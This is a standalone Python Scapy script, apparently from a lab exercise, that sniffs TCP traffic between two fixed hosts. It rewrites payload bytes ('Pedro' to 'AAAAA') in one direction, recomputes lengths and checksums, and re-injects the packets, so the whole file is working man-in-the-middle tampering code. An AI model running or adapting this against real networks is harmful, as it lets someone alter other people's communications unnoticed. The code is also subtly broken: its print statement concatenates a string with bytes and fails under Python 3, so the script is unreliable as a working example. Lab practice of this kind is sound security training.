#!/usr/bin/env python3
from scapy.all import *

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B and pkt[TCP].payload:
        # Create a new packet based on the captured one.
        # 1) We need to delete the checksum in the IP & TCP headers,
        #    because our modification will make them invalid.
        #    Scapy will recalculate them if these fields are missing.
        # 2) We also delete the original TCP payload.

        payload_before = len(pkt[TCP].payload)
        real = pkt[TCP].payload.load
        data = real.replace(b'Pedro', b'AAAAA')
        payload_after = len(data)
        payload_diff = payload_after - payload_before
        
        newpkt = IP(pkt[IP])
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)
        newpkt[IP].len = pkt[IP].len + payload_diff
        newpkt = newpkt/data

        print("Data transformed from: " + str(real) + " to: " + data)
        send(newpkt)
    
    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        newpkt = pkt[IP]
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        send(newpkt)

    
pkt = sniff(filter = 'tcp', prn = spoof_pkt)

